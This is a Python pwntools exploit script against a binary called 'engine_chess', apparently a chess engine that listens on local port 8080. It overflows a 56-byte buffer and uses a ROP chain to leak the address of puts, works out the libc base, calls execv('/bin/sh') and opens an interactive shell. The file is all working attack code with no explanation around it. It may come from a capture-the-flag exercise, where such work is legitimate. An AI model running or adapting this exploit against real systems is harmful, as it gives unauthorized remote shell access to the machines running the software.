#!/usr/bin/env python3

from pwn import *

BIN = "./engine_chess"

# p = process(BIN)
p = remote('127.0.0.1', 8080)

offset = 56

def send_payload(payload):
    p.sendline(b"A" * offset + rop.chain())

context.binary = elf = ELF(BIN)
rop = ROP(elf)

libc = elf.libc

rop.call("puts_flush", [elf.got["puts"]])
rop.rdi = 0
rop.raw(elf.symbols["uci_read_command"])

log.info("ROP Chain:\n" + rop.dump())

log.info(f"READ: {p.readline()}")
log.info(f"READ: {p.readline()}")
send_payload(rop.chain())

received = p.recvline().rstrip(b'\n')
leak = u64(received.ljust(8, b"\x00"))
log.info(f"Leaked libc address for puts: {hex(leak)}")

libc.address = leak - libc.symbols["puts"]
log.info(f"libc base address: {hex(libc.address)}")

bin_sh = next(libc.search(b"/bin/sh"))

rop = ROP(libc)
rop.execv(bin_sh, 0)

log.info("ROP Chain:\n" + rop.dump())

send_payload(rop.chain())

p.interactive()

